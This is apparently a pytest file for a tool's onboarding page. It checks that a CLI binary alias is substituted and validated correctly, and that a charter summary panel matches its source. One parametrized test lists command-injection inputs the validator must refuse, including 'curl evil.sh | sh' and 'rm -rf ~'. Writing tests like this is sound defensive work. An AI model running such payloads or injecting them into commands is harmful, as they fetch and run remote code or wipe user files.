"""The Claude-binary alias, and the "what we're asking" panel's generated content.

Two features, one file, because they share a premise: the join page renders both, and
both go wrong SILENTLY. A mis-substituted command fails in the user's shell long after
they left the page, and a drifted summary is a false assurance nobody notices at all.
"""

from __future__ import annotations

import re

import pytest

from sys_buddy import onboarding
from sys_buddy.rules import RULES_OF_ENGAGEMENT

JOIN = (onboarding.__file__).replace("onboarding.py", "join.html")


def _join() -> str:
    with open(JOIN, encoding="utf-8") as fh:
        return fh.read()


# --------------------------------------------------------------------------- #
# the alias
# --------------------------------------------------------------------------- #
def test_default_is_unchanged():
    """The overwhelming majority pass no alias, and their command must be byte-identical
    to what shipped before the feature existed."""
    cmd = onboarding.claude_setup_command("http://x/mcp", "sbk_t")
    assert cmd.splitlines()[0] == "claude mcp remove sys-buddy"
    assert cmd.splitlines()[1].startswith("claude mcp add --scope local ")


def test_an_alias_replaces_the_binary_on_every_line():
    cmd = onboarding.claude_setup_command("http://x/mcp", "sbk_t", binary="claude-work")
    lines = cmd.splitlines()
    assert lines[0].startswith("claude-work mcp remove")
    assert lines[1].startswith("claude-work mcp add")
    assert "\nclaude " not in "\n" + cmd


def test_every_connect_line_starts_with_the_binary():
    """THE JOIN PAGE DEPENDS ON THIS. It swaps the alias in with a line-anchored
    `/^claude\\b/gm` substitution rather than a round trip, which is only correct while
    the binary is the first token of every line. A command that stopped leading with it
    would leave the page silently emitting the default."""
    cmd = onboarding.claude_setup_command("http://x/mcp", "sbk_t")
    for line in cmd.splitlines():
        assert line.startswith(onboarding.DEFAULT_CLI + " "), line


def test_a_blank_alias_means_the_normal_one():
    """An empty box is 'I use the standard command', not an error."""
    for blank in ("", "   ", None):
        assert onboarding.assert_cli_binary(blank) == onboarding.DEFAULT_CLI


@pytest.mark.parametrize(
    "hostile",
    [
        "claude; curl evil.sh | sh",
        "claude && rm -rf ~",
        "claude$(id)",
        "claude `id`",
        "cla ude",
        "claude\nrm -rf /",
        "../../bin/sh",
        "a" * 65,
    ],
)
def test_a_shell_metacharacter_is_refused(hostile):
    """The rendered command is PASTED INTO A SHELL. The argv builders go to subprocess
    with no shell so they are safe either way, but a hostile 'alias' would otherwise be
    a paste-ready attack that we drew for the user ourselves."""
    with pytest.raises(ValueError):
        onboarding.assert_cli_binary(hostile)


@pytest.mark.parametrize("ok", ["claude", "claude-work", "claude.dev", "cl4ude_v2", "c+x"])
def test_real_binary_names_are_accepted(ok):
    assert onboarding.assert_cli_binary(ok) == ok


def test_the_page_validates_with_the_same_character_set_as_the_server():
    """Two validators, one rule. If they disagree, the page either accepts something the
    server would refuse or refuses something legitimate — and the page is the one a
    human is actually looking at."""
    page = _join()
    m = re.search(r"var CLI_RE = /\^(\[[^\]]+\])\{1,64\}\$/", page)
    assert m, "the page's alias validator is gone or changed shape"
    assert m.group(1) == "[A-Za-z0-9._+-]", "page and server character sets differ"


def test_the_page_anchors_its_substitution_to_line_starts():
    """A blind replace of 'claude' would also rewrite an occurrence inside the bearer
    token, producing a command that looks right and authenticates as nobody."""
    page = _join()
    assert "/^claude\\b/gm" in page


# --------------------------------------------------------------------------- #
# "what we're asking"
# --------------------------------------------------------------------------- #
def test_every_charter_rule_appears_in_the_summary():
    """The panel is PARSED from the charter, so a new rule shows up without anyone
    remembering to add it — which is the entire reason it is parsed."""
    numbers = [int(n) for n in re.findall(r"^(\d+)\.\s", RULES_OF_ENGAGEMENT, re.M)]
    assert numbers, "the charter's numbered rules no longer parse"
    assert [r["n"] for r in onboarding.charter_summary()] == numbers


def test_each_summary_line_is_the_rules_own_words():
    """Not a paraphrase. Every summary line must be a prefix of the rule it summarises,
    so the panel cannot claim something the charter does not say."""
    flat = " ".join(RULES_OF_ENGAGEMENT.split())
    for rule in onboarding.charter_summary():
        body = rule["text"].rstrip(".")
        assert body in flat, f"rule {rule['n']} summary is not the charter's own text"


def test_the_summary_is_one_sentence_per_rule():
    """A panel is a summary. If a rule's opening sentence grows into a paragraph the
    panel stops being scannable, and nobody reads it — the failure this replaces."""
    for rule in onboarding.charter_summary():
        assert rule["text"].count(". ") == 0, f"rule {rule['n']} summary is multi-sentence"


def test_asking_summary_carries_every_section_the_panel_renders():
    a = onboarding.asking_summary()
    assert set(a) == {"grants", "sends", "never", "seen_by"}
    assert a["grants"] and a["sends"] and a["never"] and a["seen_by"]


def test_the_panel_never_claims_more_than_the_broker_stores():
    """The 'sends' copy promises the broker stores no credentials. That is a real
    property of the schema (only sha256 hashes), and if it ever stopped being true this
    panel would be the most damaging place for the claim to survive."""
    from sys_buddy import db

    creds = re.findall(r"^\s+(\w*token\w*|\w*code\w*|\w*secret\w*)\s+TEXT", db.SCHEMA, re.M)
    assert creds, "no credential columns found — has the schema moved?"
    for col in creds:
        assert col.endswith("_hash"), f"{col} is not a hash; the panel's promise is stale"
